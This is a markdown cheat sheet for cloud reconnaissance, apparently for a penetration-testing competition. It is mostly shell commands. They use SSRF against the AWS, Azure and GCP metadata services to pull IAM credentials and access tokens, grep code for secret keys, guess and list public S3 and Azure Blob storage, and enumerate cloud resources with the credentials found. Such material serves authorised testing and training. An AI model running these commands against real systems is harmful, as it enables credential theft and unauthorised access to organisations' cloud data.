# Cloud Environment Reconnaissance
---

## Quick Cloud Detection

### Identify Cloud Presence

**During web app testing, look for:**
```bash
# AWS indicators
curl -s TARGET | grep -i "amazonaws.com\|s3.amazonaws\|cloudfront"

# Azure indicators  
curl -s TARGET | grep -i "azure\|windows.net\|blob.core"

# GCP indicators
curl -s TARGET | grep -i "googleapis.com\|storage.googleapis"

# Check for cloud metadata endpoints (SSRF testing)
# These should NEVER be accessible from external networks
curl http://TARGET/proxy?url=http://169.254.169.254/latest/meta-data/
```

**In source code / config files:**
```bash
# Look for AWS credentials
grep -r "AKIA" .  # AWS Access Key ID pattern
grep -r "aws_access_key_id" .
grep -r "AWS_SECRET_ACCESS_KEY" .

# Look for Azure credentials
grep -r "DefaultEndpointsProtocol=https" .
grep -r "AccountKey=" .

# Look for GCP credentials  
grep -r "type.*service_account" .
grep -r "private_key_id" .
```

---

## AWS RECONNAISSANCE

### AWS Metadata Service (IMDSv1 - If accessible via SSRF)

**CRITICAL:** This should NEVER be accessible externally. If you can reach it, you have a critical SSRF vulnerability.

```bash
# Basic metadata access (from SSRF)
curl http://169.254.169.254/latest/meta-data/

# Get instance identity
curl http://169.254.169.254/latest/meta-data/instance-id
curl http://169.254.169.254/latest/meta-data/hostname

# Get IAM role name
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get IAM credentials (CRITICAL - direct to exploitation)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# Output contains:
# - AccessKeyId
# - SecretAccessKey  
# - Token
# Use these with AWS CLI!
```

### S3 Bucket Enumeration

**Common naming patterns to test:**
```bash
# Company-based patterns
aws s3 ls s3://company-name --no-sign-request
aws s3 ls s3://companyname-backups --no-sign-request
aws s3 ls s3://companyname-logs --no-sign-request
aws s3 ls s3://companyname-data --no-sign-request
aws s3 ls s3://companyname-dev --no-sign-request
aws s3 ls s3://companyname-prod --no-sign-request

# Environment-based patterns
aws s3 ls s3://dev-companyname --no-sign-request
aws s3 ls s3://staging-companyname --no-sign-request
aws s3 ls s3://prod-companyname --no-sign-request

# Generic patterns
aws s3 ls s3://backup --no-sign-request
aws s3 ls s3://data --no-sign-request
aws s3 ls s3://files --no-sign-request
aws s3 ls s3://uploads --no-sign-request
```

### AWS CLI Enumeration (If you have creds)

```bash
# Configure AWS CLI with found credentials
aws configure set aws_access_key_id AKIAIOSFODNN7EXAMPLE
aws configure set aws_secret_access_key wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
aws configure set region us-east-1


# Verify credentials work
aws sts get-caller-identity

# List accessible resources
aws s3 ls
aws ec2 describe-instances
aws iam list-users
aws iam list-roles
aws lambda list-functions
aws rds describe-db-instances

# Check your permissions
aws iam get-user
aws iam list-attached-user-policies
```

---

## AZURE RECONNAISSANCE

### Azure Metadata Service (If accessible via SSRF)

```bash
# Access token for managed identity
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Instance metadata
curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

### Azure Blob Storage Enumeration

**Common naming patterns:**
```bash
# Storage account patterns: {name}.blob.core.windows.net
curl https://companyname.blob.core.windows.net/?comp=list
curl https://companynamedata.blob.core.windows.net/?comp=list

# Check for public containers
curl https://STORAGE_ACCOUNT.blob.core.windows.net/CONTAINER_NAME?restype=container&comp=list
```

### Azure CLI Enumeration (If have creds)

```bash
# Login with service principal
az login --service-principal \
  --username APP_ID \
  --password PASSWORD \
  --tenant TENANT_ID

# Verify authentication
az account show

# List resources
az resource list
az vm list
az storage account list
```

---

## GCP RECONNAISSANCE

### GCP Metadata Service (If accessible via SSRF)

```bash
# Requires special header
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/

# Get project ID
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/project/project-id

# Get access token
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

---

## COMPETITION WORKFLOW 

### Quick Cloud Check 

```bash
# 1. During web recon, grep for cloud indicators (2 min)
curl -s http://TARGET | grep -i "amazonaws\|azure\|googleapis"

# 2. Check for SSRF to metadata
curl "http://TARGET/proxy?url=http://169.254.169.254/latest/meta-data/"

# 3. Try common S3 bucket names
aws s3 ls s3://companyname --no-sign-request
aws s3 ls s3://companyname-backups --no-sign-request
```

### If Cloud Present

```bash
# If SSRF found → Exploit metadata service 
# - Extract IAM credentials
# - Use credentials to enumerate AWS
# - Document as CRITICAL finding

# If S3 buckets found → Test access 
# - List contents
# - Check for sensitive data
# - Document as HIGH/CRITICAL

# If credentials found → Enumerate cloud
# - Configure AWS/Azure/GCP CLI
# - List accessible resources
# - Document findings
```
